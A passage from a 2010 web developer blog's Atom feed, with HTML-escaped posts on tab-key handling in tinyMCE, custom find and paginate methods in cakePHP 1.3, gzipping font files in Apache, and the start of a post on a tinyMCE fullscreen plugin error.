  &lt;span class=&quot;c1&quot;&gt;// We get all the tabindexed elements of the page&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inputs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;:input[tabindex]&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;inputs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tabindex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// We find the next after our element and focus it&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;position&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inputs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tabindex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;inputs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;focus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;First, we discard any key press that is not a tab key.&lt;/p&gt;

&lt;p&gt;Then we check if the Shift key is pressed, and if so we add a tab character
and stop there.&lt;/p&gt;

&lt;p&gt;The biggest part is jumping to the next field. I can&amp;#39;t revert to the browser
default for that because every browser default behavior is different and I
surely don&amp;#39;t want to do some browser sniffing.&lt;/p&gt;

&lt;p&gt;I first get the list of all the input fields that have a &lt;code&gt;tabindex&lt;/code&gt;value
(your fields should have one), then I sort them in &lt;code&gt;tabindex&lt;/code&gt;order and then
loop through the list and stop when I&amp;#39;ve found one with a bigger &lt;code&gt;tabindex
&lt;/code&gt;that the actual field. I focus this one and stop the loop.&lt;/p&gt;

&lt;h2&gt;One final word&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve tested under Firefox 3.6, Chrome, Safari and Opera. Haven&amp;#39;t tested IE yet
because I still have a lot of other scripts to debug in IE first.&lt;/p&gt;

&lt;p&gt;As said earlier, maybe you could skip the whole tabindex listing if you
intelligently revert to browser default for the browser that will jump to the
next field but I have no idea how to test for that.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using custom find and paginate methods in cakePHP 1.3</title>
   <link href="http://blog.pixelastic.com/2010/05/11/using-custom-find-and-paginate-methods-in-cakephp-1-3/"/>
   <updated>2010-05-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/11/using-custom-find-and-paginate-methods-in-cakephp-1-3</id>
   <content type="html">&lt;p&gt;For the blog plugin I&amp;#39;m writing I needed a way to fetch only blog posts that
were actually published. I didn&amp;#39;t want to write the find conditions every time
I had to make a request so I tried to define a custom find method.&lt;/p&gt;

&lt;p&gt;I remember having read something about that a while ago, in a blog or in a
changelog and so I thought it will be quite easy to implement using some cake
automagic.&lt;/p&gt;

&lt;p&gt;It was not that easy, I had to override two core methods in my &lt;code&gt;AppModel&lt;/code&gt;, but
here the result :&lt;/p&gt;

&lt;h2&gt;Using custom find methods&lt;/h2&gt;

&lt;p&gt;I wanted to be able to call my custom method writing
&lt;code&gt;$this-&amp;gt;Post-&amp;gt;find(&amp;#39;published&amp;#39;)&lt;/code&gt; so I created a &lt;code&gt;__findPublished()&lt;/code&gt; method in
my Post model.&lt;/p&gt;

&lt;p&gt;It basically returns a &lt;code&gt;find(&amp;#39;all&amp;#39;)&lt;/code&gt; with custom conditions.&lt;/p&gt;

&lt;p&gt;I then edited my AppModel file to hook on the default &lt;code&gt;find()&lt;/code&gt; method :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function find($type, $options = array(), $order = null, $recursive = null) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $methodName = &amp;#39;__find&amp;#39;.ucfirst($type);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Using default method if not defined&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (!method_exists($this, $methodName)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    // We force default fields and order keys or we could run into trouble for undefined index&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $options = Set::merge(array(&amp;#39;fields&amp;#39; =&amp;gt; array(), &amp;#39;order&amp;#39; =&amp;gt; array()), $options);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return parent::find($type, $options, $order, $recursive);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Using custom method&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  return $this-&amp;gt;{$methodName}($options, $order, $recursive);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;(Note that there may still be some issues with this method, especially if the
$type parameter is not a string. I&amp;#39;m always using the &lt;code&gt;find()&lt;/code&gt; method with a
string as first argument but maybe you&amp;#39;re not, or the core still use the old
implementation.)&lt;/p&gt;

&lt;p&gt;Anyway, what it does is testing if a &lt;code&gt;__findSomething()&lt;/code&gt; method is defined,
and if it is it returns its results, otherwise it just delegates to the
default &lt;code&gt;find()&lt;/code&gt; method.&lt;/p&gt;

&lt;h2&gt;Using custom find methods in paginate&lt;/h2&gt;

&lt;p&gt;So far, so good. But now how do you tell cake to use this custom find when
paginating stuff ? The first part is easy (but required some digging into the
core code). It appears that if the zero key of the &lt;code&gt;$paginate&lt;/code&gt; var is set to a
string, this will be used as the find type.&lt;/p&gt;

&lt;p&gt;One easy way to do this is calling &lt;code&gt;array_unshift($this-&amp;gt;paginate,
&amp;#39;published&amp;#39;)&lt;/code&gt; just before the &lt;code&gt;$this-&amp;gt;paginate(&amp;#39;Post&amp;#39;)&lt;/code&gt; call in the
controller.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;// Getting the paginated post list&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;array_unshift($this-&amp;gt;paginate, &amp;#39;published&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$itemList = $this-&amp;gt;paginate($this-&amp;gt;model);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;set(&amp;#39;itemList&amp;#39;, $itemList);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You&amp;#39;ll notice that your custom find method is used for the pagination. What
you may not notice at first sight is that the total count of results is not
correct. Cake still uses the default &lt;code&gt;find(&amp;#39;count&amp;#39;)&lt;/code&gt; without using the custom
method.&lt;/p&gt;

&lt;p&gt;We will now need to create a &lt;code&gt;__paginateCountPublished()&lt;/code&gt; method in our &lt;code&gt;Post
&lt;/code&gt;model that will return the total count of posts to paginate.&lt;/p&gt;

&lt;p&gt;Forcing Cake to do what we want is a little trickier this time. We will need
to create a &lt;code&gt;paginateCount()&lt;/code&gt; method in our &lt;code&gt;AppModel&lt;/code&gt;. If such a method
exists for a given model, Cake will use it instead of the default
&lt;code&gt;find(&amp;#39;count&amp;#39;)&lt;/code&gt; when paginating results. By creating it in the &lt;code&gt;AppModel&lt;/code&gt;we
make sure that all the paginate counts use it.&lt;/p&gt;

&lt;p&gt;This method takes a third argument called $extra which will contain our custom
find name. If set, we will return the custom paginate count. If not set, we
revert to the default way of calculating the total count (copy/pasted from the
core).&lt;/p&gt;

&lt;p&gt;So, here the &lt;code&gt;paginateCount()&lt;/code&gt; method to add to your &lt;code&gt;AppModel&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function paginateCount($conditions = array(), $recursive = null, $extra = array()) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  // If no custom find specified, we return the default count&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  if (empty($extra[&amp;#39;type&amp;#39;])) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  Â Â Â  $parameters = compact(&amp;#39;conditions&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  Â Â Â  if ($recursive != $this-&amp;gt;recursive) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  Â Â Â  Â Â Â  $parameters[&amp;#39;recursive&amp;#39;] = $recursive;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  Â Â Â  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  Â Â Â  return $this-&amp;gt;find(&amp;#39;count&amp;#39;, array_merge($parameters, $extra));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;Â  // We return the __paginateCountSomething&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  $methodName = &amp;#39;__paginateCount&amp;#39;.ucfirst($extra[&amp;#39;type&amp;#39;]);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  return $this-&amp;gt;{$methodName}($conditions, $recursive, $extra);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  }&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And don&amp;#39;t forget to create a&lt;code&gt;__paginateCountPublished($conditions = array(),
$recursive = null, $extra = array())&lt;/code&gt; method in your &lt;code&gt;Post&lt;/code&gt;model&lt;/p&gt;

&lt;h2&gt;And you&amp;#39;re done&lt;/h2&gt;

&lt;p&gt;You can now do some &lt;code&gt;$this-&amp;gt;Post-&amp;gt;find(&amp;#39;published&amp;#39;)&lt;/code&gt; magic in your controller.
And don&amp;#39;t forget the &lt;code&gt;array_unshift()&lt;/code&gt; tip to use the custom find in a
paginate call, it have to be the first key.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Gzipping your font files</title>
   <link href="http://blog.pixelastic.com/2010/05/11/gzipping-your-font-files/"/>
   <updated>2010-05-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/11/gzipping-your-font-files</id>
   <content type="html">&lt;p&gt;When using &lt;code&gt;@font-face&lt;/code&gt; to display fonts, you have to create a whole bunch of
font files on your server to accomodate the quirks of the various browsers.&lt;/p&gt;

&lt;p&gt;If you do things right (or follow the automatic kit build of FontSquirell),
you should get a &lt;code&gt;.eot&lt;/code&gt; file for IE, a &lt;code&gt;.ttf&lt;/code&gt;/&lt;code&gt;.otf&lt;/code&gt; file for current
browsers, a &lt;code&gt;.svg&lt;/code&gt; file for Chrome and the iPhone/iPad and a &lt;code&gt;.woff&lt;/code&gt; file for
the next browser generation.&lt;/p&gt;

&lt;p&gt;Unfortunatly, you&amp;#39;ll have to cope with that because there isn&amp;#39;t much we can do
about it at the moment.&lt;/p&gt;

&lt;p&gt;But you can compress those files to make the font rendering faster. Some
browsers even download all the fonts even if they will only use one, so
compress them !&lt;/p&gt;

&lt;p&gt;The easiest way is to configure your server to automatically gzip them. You
should already have done that for your css and js file so it is just a matter
of adding new types.&lt;/p&gt;

&lt;p&gt;As far as I know &lt;code&gt;.otf&lt;/code&gt; and &lt;code&gt;.ttf&lt;/code&gt; files don&amp;#39;t have registered mimetype, so I
had to create a dummy one for them in my .htaccess :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nb&quot;&gt;AddType&lt;/span&gt; x-font/otfÂ Â Â  .otf
&lt;span class=&quot;nb&quot;&gt;AddType&lt;/span&gt; x-font/ttfÂ Â Â  .ttf
&lt;span class=&quot;nb&quot;&gt;AddType&lt;/span&gt; x-font/eotÂ Â Â  .eot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I also added the &lt;code&gt;.eot&lt;/code&gt; because even if an &lt;code&gt;application/vnd.ms-fontobject&lt;/code&gt;
mimetype is registered for this obscure microsoft format, when I tried to add
a deflate rule on it, my Apache crashed so I took the safest way of defining a
custom mimetype.&lt;/p&gt;

&lt;p&gt;I prefixed them with an &lt;code&gt;x-&lt;/code&gt;to make sure that it won&amp;#39;t mess with existing
mimetypes.&lt;/p&gt;

&lt;p&gt;The second part was to add gziping to those&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nb&quot;&gt;AddOutputFilterByType&lt;/span&gt; DEFLATE x-font/otf x-font/ttf x-font/eot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;SVG files are in fact xml files, and you should already have them gzipped, so
no need to add them here.&lt;/p&gt;

&lt;p&gt;I haven&amp;#39;t included &lt;code&gt;.woff&lt;/code&gt; files because &lt;code&gt;.woff&lt;/code&gt; files are already compressed
files, so you don&amp;#39;t need to gzip them.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Give your variables meaningful names</title>
   <link href="http://blog.pixelastic.com/2010/05/11/give-your-variables-meaningful-names/"/>
   <updated>2010-05-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/11/give-your-variables-meaningful-names</id>
   <content type="html">&lt;p&gt;I just realized that the fullscreen plugin I was using with tinyMCE (v3.3.5)
was throwing an error in my Firebug panel everytime I closed it.&lt;/p&gt;

&lt;p&gt;As I wrote some tinyMCE plugins myself I thought I may have done something
that was causing this. So I opened up the javascript file and checked for the
error line :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;doc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_is_enabled&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_new_window&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;closeFullscreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Call to close in new window&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;resize&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resizeFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tinyMCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_editor_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tinyMCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;mce_fullscreen_container&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_html_overflow&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setStyle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;doc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;overflow&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_overflow&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scrollTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_scrollx&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_scrolly&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tinyMCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tinyMCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oldSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Restore old settings&lt;/span&gt;
